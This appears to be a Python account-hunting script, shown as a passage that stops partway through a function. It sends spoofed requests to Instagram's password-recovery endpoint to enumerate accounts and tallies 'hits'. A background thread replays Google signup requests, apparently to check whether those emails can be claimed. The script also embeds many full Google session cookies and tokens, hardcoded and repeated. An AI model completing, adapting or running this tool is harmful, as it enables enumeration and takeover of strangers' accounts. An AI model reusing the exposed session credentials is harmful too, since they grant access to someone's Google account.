#pr1me
import requests
import random
import json
import string
import uuid
from uuid import uuid4
import time
import sys
import os
from threading import Thread
R = "\033[1;31m"
P = "\033[35m"
G = "\033[1;32m"
C = "\033[36m"
Y = "\033[1;33m"
W = "\033[1;37m"
gi = 0
bi = 0
ge = 0
be = 0
id = input(f"{R}Enter id: {W}")
token = input(f"{Y}Enter token: {W}")
os.system('clear')
def dis():
    os.system('clear')
    sys.stdout.write(
        f"➤ {W}𝐇𝐈𝐓𝐒: {R}{ge}\n"
        f"➤ {W}𝐁𝐀𝐃 𝐈𝐆: {Y}{bi}\n"
        f"➤ {W}𝐁𝐀𝐃 𝐄𝐌𝐀𝐈𝐋: {C}{be}\n"
        f"➤ {W}𝐆𝐎𝐎𝐃 𝐈𝐆: {P}{gi}\n"
    )
    sys.stdout.flush()
def primeX(x):
    url = "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/"
    headers = {
        'User-Agent': 'Instagram 311.0.0.32.118 Android (25/7.1.2; 450dpi; 2048x2048; Google; Pixel; sailfish; en_US; 545986883)',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'accept-language': 'en-US',
        'ig-intended-user-id': '0',
        'priority': 'u=3',
        'x-bloks-is-layout-rtl': 'false',
        'x-bloks-is-prism-enabled': 'true',
        'x-bloks-prism-button-version': '0',
        'x-bloks-version-id': '',
        'x-fb-client-ip': 'True',
        'x-fb-connection-type': 'WIFI',
        'x-fb-friendly-name': 'IgApi: accounts/send_recovery_flow_email/',
        'x-fb-request-analytics-tags': '{}',
        'x-fb-server-cluster': 'True',
        'x-ig-android-id': 'android-b3f0e6f37c4144ab',
        'x-ig-app-id': '567067343352427',
        'x-ig-app-locale': 'en_US',
        'x-ig-bandwidth-speed-kbps': '652.000',
        'x-ig-bandwidth-totalbytes-b': '494530',
        'x-ig-bandwidth-totaltime-ms': '906',
        'x-ig-client-endpoint': 'user_password_recovery',
        'x-ig-capabilities': '3brTv10=',
        'x-ig-connection-type': 'WIFI',
        'x-ig-device-id': 'android-a33b024322ce4156',
        'x-ig-device-locale': 'en_US',
        'x-ig-family-device-id': "26b6ddbc-5dfe-4758-8170-abd4688d0d73",
        'x-ig-mapped-locale': 'en_US',
        'x-ig-nav-chain': '',
        'x-ig-timezone-offset': '19800',
        'x-ig-www-claim': '0',
        'x-mid': '',
        'x-pigeon-rawclienttime': '',
        'x-pigeon-session-id': '',
        'x-tigon-is-retry': 'False',
        'x-fb-http-engine': 'MNS',
        'x-fb-rmd': '',
        'x-fb-session-id': '',
        'x-fb-session-private': '',
    }
    data = {
        "adid": "ece40bb6-21cf-4071-934d-11ad4cc952ab",
        "guid": "ece40bb6-21cf-4071-934d-11ad4cc952ab",
        "device_id": "android-5b7ed0786fa2ec6f",        "query": x,
        "waterfall_id": "6f838327-b51f-4bc1-89a2-32d5c8667ba7"
    }
    try:
        response = requests.post(url, headers=headers, data=data)
        if response.status_code == 200:
            j = response.json()
            try:
                e = j.get('email', {})
                if e == x:
                    global gi
                    gi += 1
                    dis()
                    primeB(x)
                else:
                    global bi
                    bi += 1
                    dis()
            except:
                bi += 1
                dis()
        else:
            bi += 1
            dis()
    except:
        bi += 1
        dis()
def primeA():
    while True:
    	cookies = {
    'OTZ': '8309472_34_34__34_',
    'SID': 'g.a0002gi1dd8yZ3FXerUbD0lZsjfxGYXmLQCZl_jOPTWrCQr-ceE8GWVt9L7iprlSOwzcUWVAQgACgYKAUoSARcSFQHGX2MiZOWVWvLTgtfWbhfZ7sgLdRoVAUF8yKqeqNLMCJ-oGrDBu5PfgPE00076',
    '__Secure-1PSID': 'g.a0002gi1dd8yZ3FXerUbD0lZsjfxGYXmLQCZl_jOPTWrCQr-ceE83m_mJ6dNigOwtdwQHl746wACgYKAQoSARcSFQHGX2MiKpvMABbiAQc8NLmTKolnABoVAUF8yKpj1EUpq9zDueQEFm9Lt0h00076',
    '__Secure-3PSID': 'g.a0002gi1dd8yZ3FXerUbD0lZsjfxGYXmLQCZl_jOPTWrCQr-ceE8qiry-9CCYWdQ5t8nipaCxQACgYKAdQSARcSFQHGX2MiBa2wMvPwAE8HrLIsR5dFshoVAUF8yKqBwoCIwTPFC1iwmyqL6DEs0076',
    'HSID': 'AHNm3CKBGdSMsBwzD',
    'SSID': 'A9SJ8D5tjdt2-sSVI',
    'APISID': 'x19sOtCKQ9WQDvbK/AzWXbrF71JpMy8m4J',
    'SAPISID': 'tSjBPiL_6sbJdMfm/AwKEElNV7V5jbpkd4',
    '__Secure-1PAPISID': 'tSjBPiL_6sbJdMfm/AwKEElNV7V5jbpkd4',
    '__Secure-3PAPISID': 'tSjBPiL_6sbJdMfm/AwKEElNV7V5jbpkd4',
    'ACCOUNT_CHOOSER': 'AFx_qI7uSXUOqgdOsZPqxaPbRZsHNy4OeBttiLK4DUn19xgC97XboFW5I0y40BRyJ1oJs-ZWO7IsXu4ZAHXG0qithHQAuv64M9R9R0zqdYuzOVu9PM9FEFvRMB-TZ0A2EvwIDj0pzrmg',
    'SEARCH_SAMESITE': 'CgQInJ8B',
    'LSID': 'o.myaccount.google.com|s.IN|s.youtube:g.a0002gi1dThmvT_f9o-xu1mdvyQC-627FG-DbcqKgfBMeBmO4UScLGGDLvJ_G6AwW7hD6gx6vAACgYKAfASARcSFQHGX2MiYXvIugm1ycYmoCqRBL5e3hoVAUF8yKoIr5NFULtUhPoShrT1oGN60076',
    '__Host-1PLSID': 'o.myaccount.google.com|s.IN|s.youtube:g.a0002gi1dThmvT_f9o-xu1mdvyQC-627FG-DbcqKgfBMeBmO4UScN4jTHtD8P3PXBQHv4YT_QQACgYKAZASARcSFQHGX2MiL81-TcFsMsc0pxkowR-CIRoVAUF8yKq0n-0Bd28my2l-UL1_OI-90076',
    '__Host-3PLSID': 'o.myaccount.google.com|s.IN|s.youtube:g.a0002gi1dThmvT_f9o-xu1mdvyQC-627FG-DbcqKgfBMeBmO4USccVsUjJ1_7TC8BuRVq-_UogACgYKAYwSARcSFQHGX2MiCp2-YMXAUpQe22R-4HmIghoVAUF8yKq-LF7ClSDYOD7pRtyVRCPL0076',
    'AEC': 'AaJma5skMQYQ0SZr_ZfmtwwwzdSnux_2e9fQgoQ3Xapf3dDFIcB1ofY5H7U',
    '__Host-GAPS': '1:pvzNQrKjktsPNONVKlFN-EqCX8wPRfwntVMWKZtBYVFrhylIOcTWiSISKyvHNHBQYKrf44Y9fwgXLROI4CG9bJxlCJ91ZQ:gNmQNjKfVCaO4wzJ',
    'NID': '526=KFxIhpHQA01Pci5nZO3I_NNnItXcg9RtWQUt4aK3RMXO_dRlm53zNSz9wdmtb3LIhq6qKhhR01xNLFgtSuwqV1QTgeLmC-irYQqYPMRA2GN7qEc1TuVOeXBKFKaZJWRHpEM4m9IcliJqFFqvIdEYxwzy1e92KeHZo1brjaY5eBj8Aax03nhmScyhxwaIkRtv33bhxxQy3rcfnh7UuG4gW_2S_hkO9fcGvB2MmVZ1D3yfSWTmEQKcNUBeu7FJ84tc7ahIy3GuRF1OHsMMdKFRe6yF7etNUh_GiqPZZT5_PdUh-kMXOavRbCZi2Yy8S4ptLqvqCW5ugDGttJauXTiXyzqKXDieBD7m0aHmoPqUNMQ4kMLibm9X4Hl0MlVC1lqovABRTU_c0kdeHnS3R587sQJWoQdruTKBiejqD--BF6T-gPiO7TzgL9gNYpRD_0u0gwuKXJj3CJXSKbYN43tnqzUwE0KiZaH37SEefN9TFRwofC31SRPB2YJXcRWZhI3jvUNQA330f9sGPxD2COsRppGZ7zg_6S4l8CtDIQmKeQq1UMSHocPFjR0q8Ewsut7Ag-ypbhFCgryWGgtzr5K4n96vrAtnR8mCJnfFbucGAC54y7XNYNIqWB_LrtqASLb8xkSQ8yuJig14HqzQOJjEB4smwEZXsAYg-N7HsIoP-BD0uZBeOp88GjOu-rEXdL4zx06qYzeeNzW4qNSwHaqvoY2O3G5U4WM0MK-brQQkXXQtplS1eZFE26hNDGtE-7RiM2G95pZTDeUeRlw',
    'SIDCC': 'AKEyXzXSTCYPFECLk7jNLIt52ji9GW4qHWur8KUZKSgndvjJsuzFbu1M4YXS0hRLQ2CD6cM3lg',
    '__Secure-1PSIDCC': 'AKEyXzWiHfXQskb1R2qC96cMYnAWt-Wg5C0oiN6YOS_FlmXr434mEDuPscZ_eBgbYFE5VAH3_wg',
    '__Secure-3PSIDCC': 'AKEyXzW9u4uKKOMqNMTrW_r_DWAFiqL02xsS1sSScw82uuYoQK4sHzcz2872VJspYQKG1OMvBvQ',
    }
    	headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 14; SM-A235F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; application/x-www-form-urlencoded;charset=UTF-8',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'x-same-domain': '1',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-full-version': '"107.0.5304.74"',
    'sec-ch-ua-platform-version': '"14.0.0"',
    'google-accounts-xsrf': '1',
    'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.74", "Not=A?Brand";v="24.0.0.0"',
    'sec-ch-ua-model': '"SM-A235F"',
    'sec-ch-ua-wow64': '?0',
    'sec-ch-ua-platform': '"Android"',
    'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
    'origin': 'https://accounts.google.com',
    'x-client-data': 'CPfpygE=',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://accounts.google.com/signup/v2/createaccount?continue=https%3A%2F%2Faccounts.google.com%2FManageAccount%3Fnc%3D1&parent_directed=true&flowName=GlifWebSignIn&flowEntry=SignUp',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'Cookie': 'OTZ=8309472_34_34__34_; SID=g.a0002gi1dd8yZ3FXerUbD0lZsjfxGYXmLQCZl_jOPTWrCQr-ceE8GWVt9L7iprlSOwzcUWVAQgACgYKAUoSARcSFQHGX2MiZOWVWvLTgtfWbhfZ7sgLdRoVAUF8yKqeqNLMCJ-oGrDBu5PfgPE00076; __Secure-1PSID=g.a0002gi1dd8yZ3FXerUbD0lZsjfxGYXmLQCZl_jOPTWrCQr-ceE83m_mJ6dNigOwtdwQHl746wACgYKAQoSARcSFQHGX2MiKpvMABbiAQc8NLmTKolnABoVAUF8yKpj1EUpq9zDueQEFm9Lt0h00076; __Secure-3PSID=g.a0002gi1dd8yZ3FXerUbD0lZsjfxGYXmLQCZl_jOPTWrCQr-ceE8qiry-9CCYWdQ5t8nipaCxQACgYKAdQSARcSFQHGX2MiBa2wMvPwAE8HrLIsR5dFshoVAUF8yKqBwoCIwTPFC1iwmyqL6DEs0076; HSID=AHNm3CKBGdSMsBwzD; SSID=A9SJ8D5tjdt2-sSVI; APISID=x19sOtCKQ9WQDvbK/AzWXbrF71JpMy8m4J; SAPISID=tSjBPiL_6sbJdMfm/AwKEElNV7V5jbpkd4; __Secure-1PAPISID=tSjBPiL_6sbJdMfm/AwKEElNV7V5jbpkd4; __Secure-3PAPISID=tSjBPiL_6sbJdMfm/AwKEElNV7V5jbpkd4; ACCOUNT_CHOOSER=AFx_qI7uSXUOqgdOsZPqxaPbRZsHNy4OeBttiLK4DUn19xgC97XboFW5I0y40BRyJ1oJs-ZWO7IsXu4ZAHXG0qithHQAuv64M9R9R0zqdYuzOVu9PM9FEFvRMB-TZ0A2EvwIDj0pzrmg; SEARCH_SAMESITE=CgQInJ8B; LSID=o.myaccount.google.com|s.IN|s.youtube:g.a0002gi1dThmvT_f9o-xu1mdvyQC-627FG-DbcqKgfBMeBmO4UScLGGDLvJ_G6AwW7hD6gx6vAACgYKAfASARcSFQHGX2MiYXvIugm1ycYmoCqRBL5e3hoVAUF8yKoIr5NFULtUhPoShrT1oGN60076; __Host-1PLSID=o.myaccount.google.com|s.IN|s.youtube:g.a0002gi1dThmvT_f9o-xu1mdvyQC-627FG-DbcqKgfBMeBmO4UScN4jTHtD8P3PXBQHv4YT_QQACgYKAZASARcSFQHGX2MiL81-TcFsMsc0pxkowR-CIRoVAUF8yKq0n-0Bd28my2l-UL1_OI-90076; __Host-3PLSID=o.myaccount.google.com|s.IN|s.youtube:g.a0002gi1dThmvT_f9o-xu1mdvyQC-627FG-DbcqKgfBMeBmO4USccVsUjJ1_7TC8BuRVq-_UogACgYKAYwSARcSFQHGX2MiCp2-YMXAUpQe22R-4HmIghoVAUF8yKq-LF7ClSDYOD7pRtyVRCPL0076; AEC=AaJma5skMQYQ0SZr_ZfmtwwwzdSnux_2e9fQgoQ3Xapf3dDFIcB1ofY5H7U; __Host-GAPS=1:pvzNQrKjktsPNONVKlFN-EqCX8wPRfwntVMWKZtBYVFrhylIOcTWiSISKyvHNHBQYKrf44Y9fwgXLROI4CG9bJxlCJ91ZQ:gNmQNjKfVCaO4wzJ; NID=526=KFxIhpHQA01Pci5nZO3I_NNnItXcg9RtWQUt4aK3RMXO_dRlm53zNSz9wdmtb3LIhq6qKhhR01xNLFgtSuwqV1QTgeLmC-irYQqYPMRA2GN7qEc1TuVOeXBKFKaZJWRHpEM4m9IcliJqFFqvIdEYxwzy1e92KeHZo1brjaY5eBj8Aax03nhmScyhxwaIkRtv33bhxxQy3rcfnh7UuG4gW_2S_hkO9fcGvB2MmVZ1D3yfSWTmEQKcNUBeu7FJ84tc7ahIy3GuRF1OHsMMdKFRe6yF7etNUh_GiqPZZT5_PdUh-kMXOavRbCZi2Yy8S4ptLqvqCW5ugDGttJauXTiXyzqKXDieBD7m0aHmoPqUNMQ4kMLibm9X4Hl0MlVC1lqovABRTU_c0kdeHnS3R587sQJWoQdruTKBiejqD--BF6T-gPiO7TzgL9gNYpRD_0u0gwuKXJj3CJXSKbYN43tnqzUwE0KiZaH37SEefN9TFRwofC31SRPB2YJXcRWZhI3jvUNQA330f9sGPxD2COsRppGZ7zg_6S4l8CtDIQmKeQq1UMSHocPFjR0q8Ewsut7Ag-ypbhFCgryWGgtzr5K4n96vrAtnR8mCJnfFbucGAC54y7XNYNIqWB_LrtqASLb8xkSQ8yuJig14HqzQOJjEB4smwEZXsAYg-N7HsIoP-BD0uZBeOp88GjOu-rEXdL4zx06qYzeeNzW4qNSwHaqvoY2O3G5U4WM0MK-brQQkXXQtplS1eZFE26hNDGtE-7RiM2G95pZTDeUeRlw; SIDCC=AKEyXzXSTCYPFECLk7jNLIt52ji9GW4qHWur8KUZKSgndvjJsuzFbu1M4YXS0hRLQ2CD6cM3lg; __Secure-1PSIDCC=AKEyXzWiHfXQskb1R2qC96cMYnAWt-Wg5C0oiN6YOS_FlmXr434mEDuPscZ_eBgbYFE5VAH3_wg; __Secure-3PSIDCC=AKEyXzW9u4uKKOMqNMTrW_r_DWAFiqL02xsS1sSScw82uuYoQK4sHzcz2872VJspYQKG1OMvBvQ',
    }
    	params = {
    'hl': 'en-GB',
    '_reqid': '76046',
    'rt': 'j',
    }
    	data = {
    'continue': 'https://accounts.google.com/ManageAccount?nc=1',
    'f.req': '["AEThLlwvKEbdFL4Q7nHbLSLtAPEHWcRv37y1g56T-TCJ0yX8pNvCJ1uk-gm69LEAg3xMqLdvkXog4xj39Ls-VNVarLwgXz7ZXD5fWL_HO6waflwiHW3g883zJ-PyGAnaYz34NWk9JfvG6-cFp3VyzyUhb08zSEV6Tjjj66HhCNRlmEnvU2jqbrcW00awdYCoIqEEhMEwTTsB",null,null,null,null,0,0,"Deol","Deol",null,0,null,1,[],1]',
    'at': 'AFoagUUkdYt7up8cfK1iFE7d0ubVNvkEyg:1761233819683',
    'azt': 'AFoagUU0uP5Kaamco0Qhr9UM8GMphtcPDg:1761233819683',
    'cookiesDisabled': 'false',
    'deviceinfo': '[null,null,null,null,null,"IN",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,1,null,0,1,"",null,null,3,0,2]',
    'gmscoreversion': 'null',
    'flowName': 'GlifWebSignIn',
    'checkConnection': 'youtube:337',
    'checkedDomains': 'youtube',
    'pstMsg': '1',
    }
    	response = requests.post(
    'https://accounts.google.com/_/signup/validatepersonaldetails',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
    )
    	cc = response.text
    	tl = cc.split('"gf.ttu",null,"')[1].split('"')[0]
    	cookies = {
    'OTZ': '8309472_34_34__34_',
    'SID': 'g.a0002gi1dd8yZ3FXerUbD0lZsjfxGYXmLQCZl_jOPTWrCQr-ceE8GWVt9L7iprlSOwzcUWVAQgACgYKAUoSARcSFQHGX2MiZOWVWvLTgtfWbhfZ7sgLdRoVAUF8yKqeqNLMCJ-oGrDBu5PfgPE00076',
    '__Secure-1PSID': 'g.a0002gi1dd8yZ3FXerUbD0lZsjfxGYXmLQCZl_jOPTWrCQr-ceE83m_mJ6dNigOwtdwQHl746wACgYKAQoSARcSFQHGX2MiKpvMABbiAQc8NLmTKolnABoVAUF8yKpj1EUpq9zDueQEFm9Lt0h00076',
    '__Secure-3PSID': 'g.a0002gi1dd8yZ3FXerUbD0lZsjfxGYXmLQCZl_jOPTWrCQr-ceE8qiry-9CCYWdQ5t8nipaCxQACgYKAdQSARcSFQHGX2MiBa2wMvPwAE8HrLIsR5dFshoVAUF8yKqBwoCIwTPFC1iwmyqL6DEs0076',
    'HSID': 'AHNm3CKBGdSMsBwzD',
    'SSID': 'A9SJ8D5tjdt2-sSVI',
    'APISID': 'x19sOtCKQ9WQDvbK/AzWXbrF71JpMy8m4J',
    'SAPISID': 'tSjBPiL_6sbJdMfm/AwKEElNV7V5jbpkd4',
    '__Secure-1PAPISID': 'tSjBPiL_6sbJdMfm/AwKEElNV7V5jbpkd4',
    '__Secure-3PAPISID': 'tSjBPiL_6sbJdMfm/AwKEElNV7V5jbpkd4',
    'ACCOUNT_CHOOSER': 'AFx_qI7uSXUOqgdOsZPqxaPbRZsHNy4OeBttiLK4DUn19xgC97XboFW5I0y40BRyJ1oJs-ZWO7IsXu4ZAHXG0qithHQAuv64M9R9R0zqdYuzOVu9PM9FEFvRMB-TZ0A2EvwIDj0pzrmg',
    'SEARCH_SAMESITE': 'CgQInJ8B',
    'LSID': 'o.myaccount.google.com|s.IN|s.youtube:g.a0002gi1dThmvT_f9o-xu1mdvyQC-627FG-DbcqKgfBMeBmO4UScLGGDLvJ_G6AwW7hD6gx6vAACgYKAfASARcSFQHGX2MiYXvIugm1ycYmoCqRBL5e3hoVAUF8yKoIr5NFULtUhPoShrT1oGN60076',
    '__Host-1PLSID': 'o.myaccount.google.com|s.IN|s.youtube:g.a0002gi1dThmvT_f9o-xu1mdvyQC-627FG-DbcqKgfBMeBmO4UScN4jTHtD8P3PXBQHv4YT_QQACgYKAZASARcSFQHGX2MiL81-TcFsMsc0pxkowR-CIRoVAUF8yKq0n-0Bd28my2l-UL1_OI-90076',
    '__Host-3PLSID': 'o.myaccount.google.com|s.IN|s.youtube:g.a0002gi1dThmvT_f9o-xu1mdvyQC-627FG-DbcqKgfBMeBmO4USccVsUjJ1_7TC8BuRVq-_UogACgYKAYwSARcSFQHGX2MiCp2-YMXAUpQe22R-4HmIghoVAUF8yKq-LF7ClSDYOD7pRtyVRCPL0076',
    'AEC': 'AaJma5skMQYQ0SZr_ZfmtwwwzdSnux_2e9fQgoQ3Xapf3dDFIcB1ofY5H7U',
    '__Host-GAPS': '1:pvzNQrKjktsPNONVKlFN-EqCX8wPRfwntVMWKZtBYVFrhylIOcTWiSISKyvHNHBQYKrf44Y9fwgXLROI4CG9bJxlCJ91ZQ:gNmQNjKfVCaO4wzJ',
    'NID': '526=KFxIhpHQA01Pci5nZO3I_NNnItXcg9RtWQUt4aK3RMXO_dRlm53zNSz9wdmtb3LIhq6qKhhR01xNLFgtSuwqV1QTgeLmC-irYQqYPMRA2GN7qEc1TuVOeXBKFKaZJWRHpEM4m9IcliJqFFqvIdEYxwzy1e92KeHZo1brjaY5eBj8Aax03nhmScyhxwaIkRtv33bhxxQy3rcfnh7UuG4gW_2S_hkO9fcGvB2MmVZ1D3yfSWTmEQKcNUBeu7FJ84tc7ahIy3GuRF1OHsMMdKFRe6yF7etNUh_GiqPZZT5_PdUh-kMXOavRbCZi2Yy8S4ptLqvqCW5ugDGttJauXTiXyzqKXDieBD7m0aHmoPqUNMQ4kMLibm9X4Hl0MlVC1lqovABRTU_c0kdeHnS3R587sQJWoQdruTKBiejqD--BF6T-gPiO7TzgL9gNYpRD_0u0gwuKXJj3CJXSKbYN43tnqzUwE0KiZaH37SEefN9TFRwofC31SRPB2YJXcRWZhI3jvUNQA330f9sGPxD2COsRppGZ7zg_6S4l8CtDIQmKeQq1UMSHocPFjR0q8Ewsut7Ag-ypbhFCgryWGgtzr5K4n96vrAtnR8mCJnfFbucGAC54y7XNYNIqWB_LrtqASLb8xkSQ8yuJig14HqzQOJjEB4smwEZXsAYg-N7HsIoP-BD0uZBeOp88GjOu-rEXdL4zx06qYzeeNzW4qNSwHaqvoY2O3G5U4WM0MK-brQQkXXQtplS1eZFE26hNDGtE-7RiM2G95pZTDeUeRlw',
    'SIDCC': 'AKEyXzXSTCYPFECLk7jNLIt52ji9GW4qHWur8KUZKSgndvjJsuzFbu1M4YXS0hRLQ2CD6cM3lg',
    '__Secure-1PSIDCC': 'AKEyXzWiHfXQskb1R2qC96cMYnAWt-Wg5C0oiN6YOS_FlmXr434mEDuPscZ_eBgbYFE5VAH3_wg',
    '__Secure-3PSIDCC': 'AKEyXzW9u4uKKOMqNMTrW_r_DWAFiqL02xsS1sSScw82uuYoQK4sHzcz2872VJspYQKG1OMvBvQ',
    }
    	headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 14; SM-A235F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; application/x-www-form-urlencoded;charset=UTF-8',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'x-same-domain': '1',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-full-version': '"107.0.5304.74"',
    'sec-ch-ua-platform-version': '"14.0.0"',
    'google-accounts-xsrf': '1',
    'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.74", "Not=A?Brand";v="24.0.0.0"',
    'sec-ch-ua-model': '"SM-A235F"',
    'sec-ch-ua-wow64': '?0',
    'sec-ch-ua-platform': '"Android"',
    'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
    'origin': 'https://accounts.google.com',
    'x-client-data': 'CPfpygE=',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': f'https://accounts.google.com/signup/v2/birthdaygender?continue=https%3A%2F%2Faccounts.google.com%2FManageAccount%3Fnc%3D1&parent_directed=true&flowName=GlifWebSignIn&flowEntry=SignUp&TL={tl}',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'Cookie': 'OTZ=8309472_34_34__34_; SID=g.a0002gi1dd8yZ3FXerUbD0lZsjfxGYXmLQCZl_jOPTWrCQr-ceE8GWVt9L7iprlSOwzcUWVAQgACgYKAUoSARcSFQHGX2MiZOWVWvLTgtfWbhfZ7sgLdRoVAUF8yKqeqNLMCJ-oGrDBu5PfgPE00076; __Secure-1PSID=g.a0002gi1dd8yZ3FXerUbD0lZsjfxGYXmLQCZl_jOPTWrCQr-ceE83m_mJ6dNigOwtdwQHl746wACgYKAQoSARcSFQHGX2MiKpvMABbiAQc8NLmTKolnABoVAUF8yKpj1EUpq9zDueQEFm9Lt0h00076; __Secure-3PSID=g.a0002gi1dd8yZ3FXerUbD0lZsjfxGYXmLQCZl_jOPTWrCQr-ceE8qiry-9CCYWdQ5t8nipaCxQACgYKAdQSARcSFQHGX2MiBa2wMvPwAE8HrLIsR5dFshoVAUF8yKqBwoCIwTPFC1iwmyqL6DEs0076; HSID=AHNm3CKBGdSMsBwzD; SSID=A9SJ8D5tjdt2-sSVI; APISID=x19sOtCKQ9WQDvbK/AzWXbrF71JpMy8m4J; SAPISID=tSjBPiL_6sbJdMfm/AwKEElNV7V5jbpkd4; __Secure-1PAPISID=tSjBPiL_6sbJdMfm/AwKEElNV7V5jbpkd4; __Secure-3PAPISID=tSjBPiL_6sbJdMfm/AwKEElNV7V5jbpkd4; ACCOUNT_CHOOSER=AFx_qI7uSXUOqgdOsZPqxaPbRZsHNy4OeBttiLK4DUn19xgC97XboFW5I0y40BRyJ1oJs-ZWO7IsXu4ZAHXG0qithHQAuv64M9R9R0zqdYuzOVu9PM9FEFvRMB-TZ0A2EvwIDj0pzrmg; SEARCH_SAMESITE=CgQInJ8B; LSID=o.myaccount.google.com|s.IN|s.youtube:g.a0002gi1dThmvT_f9o-xu1mdvyQC-627FG-DbcqKgfBMeBmO4UScLGGDLvJ_G6AwW7hD6gx6vAACgYKAfASARcSFQHGX2MiYXvIugm1ycYmoCqRBL5e3hoVAUF8yKoIr5NFULtUhPoShrT1oGN60076; __Host-1PLSID=o.myaccount.google.com|s.IN|s.youtube:g.a0002gi1dThmvT_f9o-xu1mdvyQC-627FG-DbcqKgfBMeBmO4UScN4jTHtD8P3PXBQHv4YT_QQACgYKAZASARcSFQHGX2MiL81-TcFsMsc0pxkowR-CIRoVAUF8yKq0n-0Bd28my2l-UL1_OI-90076; __Host-3PLSID=o.myaccount.google.com|s.IN|s.youtube:g.a0002gi1dThmvT_f9o-xu1mdvyQC-627FG-DbcqKgfBMeBmO4USccVsUjJ1_7TC8BuRVq-_UogACgYKAYwSARcSFQHGX2MiCp2-YMXAUpQe22R-4HmIghoVAUF8yKq-LF7ClSDYOD7pRtyVRCPL0076; AEC=AaJma5skMQYQ0SZr_ZfmtwwwzdSnux_2e9fQgoQ3Xapf3dDFIcB1ofY5H7U; __Host-GAPS=1:pvzNQrKjktsPNONVKlFN-EqCX8wPRfwntVMWKZtBYVFrhylIOcTWiSISKyvHNHBQYKrf44Y9fwgXLROI4CG9bJxlCJ91ZQ:gNmQNjKfVCaO4wzJ; NID=526=KFxIhpHQA01Pci5nZO3I_NNnItXcg9RtWQUt4aK3RMXO_dRlm53zNSz9wdmtb3LIhq6qKhhR01xNLFgtSuwqV1QTgeLmC-irYQqYPMRA2GN7qEc1TuVOeXBKFKaZJWRHpEM4m9IcliJqFFqvIdEYxwzy1e92KeHZo1brjaY5eBj8Aax03nhmScyhxwaIkRtv33bhxxQy3rcfnh7UuG4gW_2S_hkO9fcGvB2MmVZ1D3yfSWTmEQKcNUBeu7FJ84tc7ahIy3GuRF1OHsMMdKFRe6yF7etNUh_GiqPZZT5_PdUh-kMXOavRbCZi2Yy8S4ptLqvqCW5ugDGttJauXTiXyzqKXDieBD7m0aHmoPqUNMQ4kMLibm9X4Hl0MlVC1lqovABRTU_c0kdeHnS3R587sQJWoQdruTKBiejqD--BF6T-gPiO7TzgL9gNYpRD_0u0gwuKXJj3CJXSKbYN43tnqzUwE0KiZaH37SEefN9TFRwofC31SRPB2YJXcRWZhI3jvUNQA330f9sGPxD2COsRppGZ7zg_6S4l8CtDIQmKeQq1UMSHocPFjR0q8Ewsut7Ag-ypbhFCgryWGgtzr5K4n96vrAtnR8mCJnfFbucGAC54y7XNYNIqWB_LrtqASLb8xkSQ8yuJig14HqzQOJjEB4smwEZXsAYg-N7HsIoP-BD0uZBeOp88GjOu-rEXdL4zx06qYzeeNzW4qNSwHaqvoY2O3G5U4WM0MK-brQQkXXQtplS1eZFE26hNDGtE-7RiM2G95pZTDeUeRlw; SIDCC=AKEyXzXSTCYPFECLk7jNLIt52ji9GW4qHWur8KUZKSgndvjJsuzFbu1M4YXS0hRLQ2CD6cM3lg; __Secure-1PSIDCC=AKEyXzWiHfXQskb1R2qC96cMYnAWt-Wg5C0oiN6YOS_FlmXr434mEDuPscZ_eBgbYFE5VAH3_wg; __Secure-3PSIDCC=AKEyXzW9u4uKKOMqNMTrW_r_DWAFiqL02xsS1sSScw82uuYoQK4sHzcz2872VJspYQKG1OMvBvQ',
    }
    	params = {
    'hl': 'en-GB',
    'TL': tl,
    '_reqid': '376046',
    'rt': 'j',
    }
    	data = {
    'continue': 'https://accounts.google.com/ManageAccount?nc=1',
    'f.req': f'["TL:{tl}",2015,10,13,2,null,null,0,null,null,0,0]',
    'at': 'AFoagUUkdYt7up8cfK1iFE7d0ubVNvkEyg:1761233819683',
    'azt': 'AFoagUU0uP5Kaamco0Qhr9UM8GMphtcPDg:1761233819683',
    'cookiesDisabled': 'false',
    'deviceinfo': '[null,null,null,null,null,"IN",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,1,null,0,1,"",null,null,3,0,2]',
    'gmscoreversion': 'null',
    'flowName': 'GlifWebSignIn',
    'checkConnection': 'youtube:337',
    'checkedDomains': 'youtube',
    'pstMsg': '1',
    }
    	response = requests.post(
    'https://accounts.google.com/_/signup/validatebasicinfo',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
    )
    	try:
    		with open("pri1.txt", "w", encoding="utf-8") as ss:
    			ss.write(tl)
    	except:
    		primeA()
Thread(target=primeA, daemon=True).start()
def primey(sax):
    url = "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/"
    headers = {
    'User-Agent': 'Instagram 311.0.0.32.118 Android (25/7.1.2; 450dpi; 2048x2048; Google; Pixel; sailfish; en_US; 545986883)',
    # 'Accept-Encoding': 'zstd',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'accept-language': 'en-US',
    'ig-intended-user-id': '0',
    'priority': 'u=3',
    'x-bloks-is-layout-rtl': 'false',
    'x-bloks-is-prism-enabled': 'true',
    'x-bloks-prism-button-version': '0',
    'x-bloks-version-id': '',
